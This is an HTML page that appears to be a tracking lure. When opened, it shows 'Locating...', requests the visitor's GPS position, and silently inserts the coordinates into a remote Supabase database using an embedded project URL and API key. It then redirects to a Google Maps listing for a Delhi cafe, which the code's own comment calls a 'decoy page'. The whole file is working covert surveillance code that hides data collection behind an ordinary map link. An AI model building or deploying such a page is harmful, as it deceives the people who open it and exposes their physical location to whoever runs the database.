<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Location...</title>
    <!-- Include Supabase JS Client -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>
    <p>Locating...</p>

    <script>
        // 1. Define the default coordinates you want
        const DEFAULT_LAT = 28.566083140643272;
        const DEFAULT_LON = 77.23341545101384;

        // 2. Initialize Supabase (Replace with your actual URL and Key)
        const supabaseUrl = 'https://qxxgdtnoilpaiyqpvtie.supabase.co';
        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4eGdkdG5vaWxwYWl5cXB2dGllIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk0NTk5NDgsImV4cCI6MjEwNTAzNTk0OH0.TcMTA54ZcEa8x0T7v9uWFWEc_kbq30xn-rsJmTiDNzs';
        const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

        async function trackLocation() {
            let lat = DEFAULT_LAT;
            let lon = DEFAULT_LON;

            // 3. Try to get real GPS location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Success: Use real GPS
                        lat = position.coords.latitude;
                        lon = position.coords.longitude;
                        console.log("Real GPS acquired:", lat, lon);
                        saveLocation(lat, lon);
                    },
                    (error) => {
                        // Failure: Use Default Coordinates
                        console.warn("GPS failed, using default location:", error);
                        // Lat and Lon remain as DEFAULT_LAT and DEFAULT_LON
                        saveLocation(lat, lon);
                    }
                );
            } else {
                // Browser doesn't support geolocation
                console.warn("Geolocation not supported, using default location.");
                saveLocation(lat, lon);
            }
        }

        async function saveLocation(lat, lon) {
            try {
                const { data, error } = await supabase
                    .from('locations')
                    .insert([
                        { 
                            latitude: lat, 
                            longitude: lon,
                            // Optional: Add a timestamp
                            timestamp: new Date().toISOString()
                        }
                    ])
                    .select(); // Optional: return the inserted data

                if (error) {
                    console.error('Error inserting location:', error);
                } else {
                    console.log('Location saved successfully');
                }
            } catch (err) {
                console.error('Supabase connection error:', err);
            }

            // 4. Redirect to the decoy page AFTER saving (or after a tiny delay)
            setTimeout(() => {
                window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
            }, 500); // 500ms delay to ensure save completes
        }

        // Start the process
        trackLocation();
    </script>
</body>
</html>
